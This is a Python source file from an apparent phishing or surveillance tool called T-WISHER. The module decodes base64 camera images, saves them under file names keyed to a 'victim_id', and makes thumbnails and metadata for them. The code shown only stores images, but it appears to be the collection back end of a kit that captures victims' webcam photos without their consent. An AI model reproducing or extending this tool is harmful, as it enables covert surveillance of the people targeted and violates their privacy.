#!/usr/bin/env python3
"""
Camera Capture Module for T-WISHER
Handles camera image processing
"""

import os
import base64
from datetime import datetime
from PIL import Image
import io

class CameraCapture:
    def __init__(self, save_dir='data/images'):
        self.save_dir = save_dir
        os.makedirs(save_dir, exist_ok=True)
    
    def save_image(self, image_data, victim_id):
        """Save base64 image to file"""
        try:
            # Remove header if present
            if ',' in image_data:
                image_data = image_data.split(',')[1]
            
            # Decode and save
            image_bytes = base64.b64decode(image_data)
            timestamp = int(datetime.now().timestamp())
            filename = f"{self.save_dir}/cam_{victim_id}_{timestamp}.jpg"
            
            with open(filename, 'wb') as f:
                f.write(image_bytes)
            
            # Create thumbnail
            self.create_thumbnail(filename)
            
            return filename
        except Exception as e:
            print(f"[!] Error saving image: {e}")
            return None
    
    def create_thumbnail(self, image_path, size=(320, 240)):
        """Create thumbnail of captured image"""
        try:
            img = Image.open(image_path)
            img.thumbnail(size)
            thumb_path = image_path.replace('.jpg', '_thumb.jpg')
            img.save(thumb_path)
            return thumb_path
        except:
            return None
    
    def get_image_info(self, image_path):
        """Get image metadata"""
        try:
            img = Image.open(image_path)
            return {
                'size': img.size,
                'format': img.format,
                'mode': img.mode
            }
        except:
            return None
